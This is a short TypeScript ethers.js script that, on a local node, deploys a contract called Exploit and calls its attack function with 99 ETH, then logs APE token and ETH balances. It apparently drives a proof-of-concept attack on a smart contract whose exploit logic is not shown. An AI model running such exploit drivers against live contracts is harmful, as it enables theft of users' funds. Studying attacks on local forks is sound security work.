import { BigNumber, Wallet } from 'ethers';
import { getDefaultProvider } from '@ethersproject/providers';
// import {  } from './types/ethers-contracts';
import { defaultAbiCoder, formatEther, getAddress, parseEther } from 'ethers/lib/utils';
import { Exploit__factory } from './types/ethers-contracts';


const provider = getDefaultProvider("http://127.0.0.1:8545");

const bobPrivateKey = "";
const bob = new Wallet(bobPrivateKey, provider);

;(async () => {
  await work();
})()

async function work() {
  console.log("ETH:", await getETHBalance(bob.address))

  let exploit = await new Exploit__factory().connect(bob).deploy();
  await exploit.deployTransaction.wait();
  await exploit.attack(parseEther("10"), {value: parseEther("99")});

  console.log("Balance of APE:", formatEther((await exploit.APEbalance()).toString()));

  console.log("ETH:",await getETHBalance(bob.address))
}

async function getETHBalance(address:string) {
  return formatEther(await (await provider.getBalance(address)).toString())
}
